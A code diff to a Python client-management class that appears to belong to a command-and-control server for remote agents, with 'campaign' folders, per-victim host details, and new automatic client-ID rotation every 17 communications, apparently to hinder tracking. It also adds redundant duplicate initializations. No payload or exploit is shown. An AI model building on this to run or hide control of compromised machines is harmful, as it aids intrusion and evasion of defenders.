@@ -14,6 +14,16 @@ class ClientManager:
         self.log_event = log_event  # This is now the log_client_event method from LogManager
         self.client_verifier = None  # Will be set by the server to the ClientVerifier instance
         self.client_keys = {}  # Storage for client-specific encryption keys
+        self.clients = {}
+        self.command_update_callbacks = {}
+        self.log_event = log_event
+        self.client_verifier = None
+        self.client_keys = {}
+        
+        # New fields for auto rotation
+        self.auto_rotation_enabled = True  # Default enabled
+        self.rotation_frequency = 17  # Default frequency is 17 communications
+        self.load_rotation_config()  # Load configuration from file if available
 
     def add_client(self, ip, hostname="Unknown", username="Unknown", machine_guid="Unknown", 
                 os_version="Unknown", mac_address="Unknown", system_info=None, client_id=None, current_id=None):
@@ -69,7 +79,11 @@ class ClientManager:
                     "verified": True,
                     "confidence": 100,
                     "warnings": ["New client"]
-                }
+                },
+                # Add communication counter for auto rotation
+                "communication_counter": 0,
+                # Track rotation commands
+                "rotation_commands_sent": 0
             }
             
             # Set current client ID if provided and different
@@ -453,3 +467,56 @@ class ClientManager:
                 json.dump(client_data, f, indent=2)
         except Exception as e:
             self.log_event("ERROR", "Storage Error", f"Failed to save clients: {str(e)}")
+    def load_rotation_config(self):
+        """Load rotation configuration from agent_config.json if available"""
+        try:
+            # Find any campaign folder
+            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
+            if campaign_dirs:
+                # Use the first campaign found
+                campaign_folder = campaign_dirs[0]
+                config_file = os.path.join(campaign_folder, "agent_config.json")
+                
+                if os.path.exists(config_file):
+                    with open(config_file, 'r') as f:
+                        config = json.load(f)
+                    
+                    # Load auto rotation settings
+                    if "auto_rotation_enabled" in config:
+                        self.auto_rotation_enabled = config["auto_rotation_enabled"]
+                    if "rotation_frequency" in config:
+                        self.rotation_frequency = int(config["rotation_frequency"])
+        except Exception as e:
+            print(f"Warning: Could not load auto rotation config: {e}")
+
+    def increment_communication_counter(self, client_id):
+        """Increment the communication counter for a client and check if rotation is needed"""
+        # Find the original client ID if we're given a rotated ID
+        original_id = self.get_original_client_id(client_id)
+        
+        if original_id in self.clients:
+            # Initialize counter if it doesn't exist
+            if "communication_counter" not in self.clients[original_id]:
+                self.clients[original_id]["communication_counter"] = 0
+            
+            # Increment counter
+            self.clients[original_id]["communication_counter"] += 1
+            counter = self.clients[original_id]["communication_counter"]
+            
+            # Check if we need to auto-rotate based on counter and configuration
+            if self.auto_rotation_enabled and counter >= self.rotation_frequency:
+                # Reset counter
+                self.clients[original_id]["communication_counter"] = 0
+                
+                # Check if client is verified before rotation
+                is_verified = self.clients[original_id].get("verification_status", {}).get("verified", False)
+                
+                if is_verified:
+                    # Log that we're auto-rotating
+                    self.log_event(original_id, "Security", f"Auto-rotating client ID after {counter} communications")
+                    return True  # Signal that rotation is needed
+                else:
+                    # Skip rotation for unverified clients
+                    self.log_event(original_id, "Security", f"Skipping auto-rotation for unverified client (count: {counter})")
+            
+        return False  # No rotation needed
